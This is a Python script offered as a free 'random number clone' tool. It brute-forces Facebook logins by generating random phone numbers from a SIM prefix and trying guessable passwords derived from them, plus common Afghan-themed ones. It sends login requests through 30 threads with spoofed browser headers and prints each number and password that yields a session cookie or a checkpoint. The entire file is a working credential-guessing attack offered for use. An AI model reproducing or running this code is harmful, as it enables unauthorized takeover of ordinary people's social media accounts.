#WRITTEN BY RK_joker KESHMI
#------------ import-----------#
import os
from os import system as sy
import random
import string
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
#------------ color-----------#
R='\033[31m' #RED
G='\033[32m' #GREEN
Y='\033[33m' #YELLOW
B='\033[34m'#BLUE
P='\033[35m'#PURPLE
W='\033[37m'#WHITE
 
oks=[]
cps=[]
loop=0
#------------logo------------#
logo=('''\033[1;32m 
\033[1;32m 
\033[1;32m ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⡆\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠉⠁⠉⠉⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠈⠙⠻⢿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢰⡄⠀⠀⠀⢳⡄⣿⣶⣄⠀⢿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢸⣿⣦⠀⠀⢸⣿⣿⣿⣿⣷⣸⣿⣿⣿⡇\033[1;32m
\033[1;32m⠠⢤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⣿⣿⣷⡀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠈⠙⠻⣿⣿⠿⠃⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠿⠿⠿⠿⠿⠿⠟⠛⠻⣿⡀⠀⠀⠀⣿⣿⣿⣷⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠈⠀⠀⢀⣀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡇⠀⠀⠀⣿⣿⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⢀⣤⣾⣿⠟⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣀⣀⡀⠀⠀⣀⠀⠀⠀⢸⣧⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⣠⡶⠿⠟⠛⠁⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣫⣶⡿⣀⣀⡉⠓⠞⠁⠀⠀⠀⢸⣿⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⢸⣿⡏⣴⠁⢀⠉⢢⠀⠀⠀⠀⠀⢸⣿⠀⠀⡎⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣶⠸⣿⣇⠻⣀⡼⠀⢸⠀⠀⠀⠀⠀⢸⣿⠀⢠⠁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠸⢿⣧⠙⢿⣿⠁⠀⣠⡞⠀⠀⠀⠀⠀⢸⣿⢀⡎⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⢰⣶⣦⡀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⠘⠋⠉⠀⠀⠀⠀⠀⠀⢸⣿⣾⢁⣀⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣇⠀⣿⣿⣿⣷⣶⣦⣤⣉⠉⠩⣍⣉⣙⣛⡛⠛⠛⠛⠛⣀⣤⣤⣤⣤⣴⣶⣶⡶⣾⡿⠛⠛⠛⠉⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢰⣿⣿⣿⡿⠿⠟⠛⠛⠳⠦⢌⠻⢿⣿⣿⣿⣿⣿⠀⠀⠉⠉⢀⠴⠚⠉⠀⠀⣼⠁⢀⣀⣤⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⢼⣿⣿⣿⣿⣿⣿⣿⣿⣔⣾⣿⠁⢠⡄⠐⣮⣴⣭⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠁⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣤⣬⣥⣬⣽⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣠⣤⣤⣤⣤⣤⣤⣤⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠈⢻⣿⣿⣿⣿⡟⠁⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⡿⣿⠿⣛⣭⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠙⠿⠿⠋⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠇⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⢟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⡿⣻⣿⣿⡿⠛⠛⠛⠛⠛⠛⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⢟⣽⣿⣿⣿⣿⣷⣶⣿⡿⠿⠿⠿⠷⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠺⢿⣿⣿⣿⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣄⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⣠⣴⡿⠟⠁⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣤⡈⠛⠿⣿⣿⣿⣿⠟⣋⣠⣤⣶⡿⠟⠋⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣷⣶⣤⣤⣤⣤⣤⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\033[1;32m
\033[1;32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠇\033[1;32m
#-----------clear------------#
def clear():
    sy('clear')
    print(logo)
    print(40*'-')
    print(F'[{G}+{R}]FACEBOOK : 𝗦𝗛𝗔𝗛𝗜 𝗝𝗢𝗞𝗘𝗥')
    print(F'[{G}+{B}]Telegram  : 0707266012')
    print(F'[{G}+{P}]TOOLS    : FREE{W}')
    print(40*'-')
#----------Main--------#
def Main():
    clear()
    print(F'[{R}1{G}] RANDOM NUMBER CLONE')
    print(F'[{R}2{G}] FOLLOW MY ACCOUNT')
    print(F'[{R}0{G}] EXIT')
    print(40*'-')
    user =input(F'[{G}??{R}]ENTER CHOICE >> ')
    if user in ['01','1']:
        AFG()
    elif user in ['02','2']:
        sy('xdg-open https://www.facebook.com/kanokwan.plengien')
    elif user in ['00','0']:
        exit('THANKS FOR USE MY SCRIPT')
    else:
        exit()
#----------AFG_Clone-------#
def AFG():
    user=[]
    print(' EXAMPLE SIM COD : 079~070~077~078')
    cod=input(' ENTER SIM COD : ')
    print(40*'-')
    print(' EXAMPLE LIMIT : [2000] [5000] [10000]')
    try:
        limit=int(input(' ENTER LIMIT : '))
    except ValueError:
        limit=50000
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as king:
        tl=str(len(user))
        clear()
        print('TOTAL LIMIT : '+tl)
        print('SIM COD : '+cod)
        print('USE AIRPLANE FOR SPEED UP')
        print(40*'-')
        for psx in user:
            ids=cod+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[:5],'۱۲۳۴۵۶','۱۰۰۲۰۰','۵۰۰۵۰۰','۱۰۰۰۱۰۰۰','۱۰۰۰۲۰۰۰','500500','10001000','10002000','afghan1234','afghan123','afghan12345','afghanistan','Afghanistan','Afghan123','Afghan1234']
            king.submit(M1,ids,passlist)
    print(40*'-')
    print(' THE PROCESS HAS COMPLETED')
    print('TOTAL OK ID'+str(oks))
    print('TOTAL CP ID'+str(cps))
    input(' PRESS ENTER TO BACK : ')
    Main()
#______M1________#
def M1(ids,passlist):
    global oks
    global cps
    global loop
    sys.stdout.write(F'\r\r{P}[RK_joker] %s|{G}OK:-%s'%(loop,len(oks))),sys.stdout.flush()
    try:
        for pas in passlist:
            session=requests.Session()
            free_fb=session.get('https://free.facebook.com').text
            datax={
                "lsd":re.search('name="lsd" value="(.*?)"',str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"',str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"',str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In"}
            header={'authority': 'web.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,sl-SI;q=0.6,sl;q=0.5', 'cache-control': 'max-age=0', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Linux"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36', 'viewport-width': '980'}
            reqx=session.post('https://web.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjg2MDMwNzQ4LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D',data=datax,headers=header).text
            req=session.cookies.get_dict().keys()
            if 'c_user' in req:
                print(F'\r\r {G}RK_joker-OK '+ids+' | '+pas+'{W}')
                oks.append(ids)
                break
            elif 'checkpoint' in req:
                print(F'\r\r {R}RK_joker-CP '+ids+' | '+pas+'{W}')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#----------end----------#
Main()
